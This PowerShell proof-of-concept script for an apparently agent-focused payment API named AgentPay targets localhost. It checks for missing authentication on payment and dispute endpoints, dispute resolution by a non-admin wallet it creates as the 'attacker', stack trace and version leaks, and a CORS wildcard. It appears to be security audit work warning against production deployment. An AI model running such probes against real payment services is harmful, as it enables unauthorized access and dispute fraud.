# AgentPay Security POC - CRITICAL Vulnerabilities Demonstration
# DO NOT RUN AGAINST PRODUCTION SYSTEMS

$API_BASE = "http://localhost:3100"

Write-Host "=== AgentPay Security POC ===" -ForegroundColor Red
Write-Host ""

# VULN-001: Unauthenticated Payment Access
Write-Host "[VULN-001] Testing unauthenticated payment access..." -ForegroundColor Yellow
$response = Invoke-WebRequest -Uri "$API_BASE/api/payments/test-id" -ErrorAction SilentlyContinue
if ($response.StatusCode -eq 404) {
    Write-Host "✓ Endpoint accessible without auth (404 = payment not found, not 401 unauthorized)" -ForegroundColor Green
} else {
    Write-Host "✗ Unexpected response: $($response.StatusCode)" -ForegroundColor Red
}
Write-Host ""

# VULN-002: Unauthenticated Dispute Creation
Write-Host "[VULN-002] Testing unauthenticated dispute creation..." -ForegroundColor Yellow
try {
    $response = Invoke-WebRequest -Uri "$API_BASE/api/payments/test-id/dispute" -Method POST -ErrorAction Stop
    Write-Host "✓ Endpoint accessible without auth!" -ForegroundColor Green
} catch {
    if ($_.Exception.Response.StatusCode -eq 400) {
        Write-Host "✓ Endpoint accessible without auth (400 = bad request, not 401 unauthorized)" -ForegroundColor Green
    } else {
        Write-Host "✗ Unexpected error: $($_.Exception.Message)" -ForegroundColor Red
    }
}
Write-Host ""

# VULN-003: Unauthorized Dispute Resolution
Write-Host "[VULN-003] Testing unauthorized dispute resolution..." -ForegroundColor Yellow
# Create attacker wallet
$body = @{ name = "AttackerWallet" } | ConvertTo-Json
$attacker = Invoke-WebRequest -Uri "$API_BASE/api/wallets/connect/internal" -Method POST -Body $body -ContentType "application/json" | ConvertFrom-Json
Write-Host "Created attacker wallet: $($attacker.wallet.id)" -ForegroundColor Cyan

# Try to resolve dispute with non-admin wallet
$body = @{ resolution = "release" } | ConvertTo-Json
try {
    $response = Invoke-WebRequest -Uri "$API_BASE/api/disputes/fake-id/resolve" `
        -Method POST `
        -Headers @{"X-API-Key"=$attacker.apiKey} `
        -Body $body `
        -ContentType "application/json" `
        -ErrorAction Stop
    Write-Host "✓ CRITICAL: Non-admin can call resolve endpoint!" -ForegroundColor Green
} catch {
    if ($_.Exception.Response.StatusCode -eq 404) {
        Write-Host "✓ CRITICAL: Endpoint accepts request from non-admin (404 = not found, NOT 403 forbidden)" -ForegroundColor Green
        Write-Host "  This proves ANY authenticated user can resolve disputes!" -ForegroundColor Red
    } elseif ($_.Exception.Response.StatusCode -eq 400) {
        Write-Host "✓ CRITICAL: Endpoint accepts request from non-admin (400 = bad request, NOT 403 forbidden)" -ForegroundColor Green
    } else {
        Write-Host "✗ Unexpected error: $($_.Exception.Response.StatusCode)" -ForegroundColor Red
    }
}
Write-Host ""

# VULN-004: Stack Trace Disclosure
Write-Host "[VULN-004] Testing stack trace disclosure..." -ForegroundColor Yellow
try {
    # This endpoint triggers an error due to missing database table
    $response = Invoke-WebRequest -Uri "$API_BASE/api/wallets/$($attacker.wallet.id)" `
        -Headers @{"X-API-Key"=$attacker.apiKey} `
        -ErrorAction Stop
} catch {
    $errorBody = $_.ErrorDetails.Message
    if ($errorBody -match "D:\\agentspay" -or $errorBody -match "SqliteError") {
        Write-Host "✓ CRITICAL: Full stack trace exposed!" -ForegroundColor Green
        Write-Host "  Exposed paths and internal details detected" -ForegroundColor Red
    } else {
        Write-Host "✗ Stack trace not detected (may be fixed)" -ForegroundColor Yellow
    }
}
Write-Host ""

# VULN-005: Public Service Registry
Write-Host "[VULN-005] Testing public service registry access..." -ForegroundColor Yellow
$response = Invoke-WebRequest -Uri "$API_BASE/api/services" | ConvertFrom-Json
if ($response.ok -eq $true) {
    Write-Host "✓ Service registry publicly accessible!" -ForegroundColor Green
    Write-Host "  Found $($response.services.Count) services" -ForegroundColor Cyan
    if ($response.services.Count -gt 0) {
        Write-Host "  Sample service: $($response.services[0].name) - Price: $($response.services[0].price)" -ForegroundColor Cyan
        Write-Host "  Agent ID exposed: $($response.services[0].agentId)" -ForegroundColor Red
    }
}
Write-Host ""

# VULN-006: CORS Wildcard
Write-Host "[VULN-006] Testing CORS configuration..." -ForegroundColor Yellow
$response = Invoke-WebRequest -Uri "$API_BASE/api/health"
$corsHeader = $response.Headers["Access-Control-Allow-Origin"]
if ($corsHeader -eq "*") {
    Write-Host "✓ CORS wildcard detected: $corsHeader" -ForegroundColor Green
    Write-Host "  Any website can make requests to this API!" -ForegroundColor Red
}
Write-Host ""

# VULN-009: Version Disclosure
Write-Host "[VULN-009] Testing version disclosure..." -ForegroundColor Yellow
$response = Invoke-WebRequest -Uri "$API_BASE/api/health" | ConvertFrom-Json
if ($response.version) {
    Write-Host "✓ Version exposed: $($response.version)" -ForegroundColor Green
}
Write-Host ""

Write-Host "=== POC Complete ===" -ForegroundColor Red
Write-Host ""
Write-Host "SUMMARY: Multiple CRITICAL vulnerabilities confirmed" -ForegroundColor Red
Write-Host "- Payment system has NO authentication/authorization" -ForegroundColor Red
Write-Host "- Dispute resolution has NO admin checks" -ForegroundColor Red
Write-Host "- Stack traces expose internal details" -ForegroundColor Red
Write-Host "- Service registry is public" -ForegroundColor Red
Write-Host ""
Write-Host "DO NOT DEPLOY TO PRODUCTION" -ForegroundColor Red
